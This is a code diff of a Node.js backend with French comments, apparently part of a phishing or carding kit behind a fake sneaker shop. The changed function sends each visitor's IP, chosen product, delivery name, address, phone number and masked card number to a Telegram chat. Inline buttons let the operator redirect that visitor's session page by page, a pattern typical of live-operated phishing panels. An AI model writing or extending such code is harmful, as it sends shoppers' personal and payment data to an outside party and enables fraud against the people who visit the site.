@@ -22,15 +22,25 @@ const sessions = {}; // sessionId -> { data:{...}, redirect:null }
 // Envoi notif Telegram
 async function sendTelegramNotif(data){
   if(!TELEGRAM_API || !CHAT_ID) return console.warn('Telegram non configuré.');
-  const textLines = [];
-  textLines.push('🆕 <b>NOUVELLE VISITE</b>');
-  textLines.push('🆔 <b>Session:</b> ' + data.sessionId);
-  textLines.push('📄 <b>Page:</b> ' + (data.page || 'Accueil'));
-  if(data.ip) textLines.push('🌐 <b>IP:</b> ' + data.ip);
-  textLines.push('🕓 ' + new Date().toLocaleString());
 
-  const text = textLines.join('\\n');
+  // Création du message clair
+  const lines = [
+    '🆕 <b>NOUVELLE VISITE</b>',
+    `🌐 <b>IP:</b> ${data.ip || '—'}`,        // on garde l'IP
+    `📄 <b>Page:</b> ${data.page || 'Accueil'}`
+  ];
 
+  if(data.pair) lines.push(`👟 <b>Paire choisie:</b> ${data.pair}`);
+  if(data.delivery){
+    lines.push(`📦 <b>Livraison:</b> ${data.delivery.nom} ${data.delivery.prenom}`);
+    lines.push(`🏠 <b>Adresse:</b> ${data.delivery.adresse}`);
+    lines.push(`📞 <b>Téléphone:</b> ${data.delivery.telephone}`);
+  }
+  if(data.card) lines.push(`💳 <b>Carte:</b> ${data.card.panMasked}`);
+
+  const text = lines.join('\n');
+
+  // Inline keyboard (boutons restent les mêmes)
   const keyboard = {
     inline_keyboard: [
       [ { text: '➡️ Aller vers Produit', callback_data: 'redirect|' + data.sessionId + '|/product.html' } ],
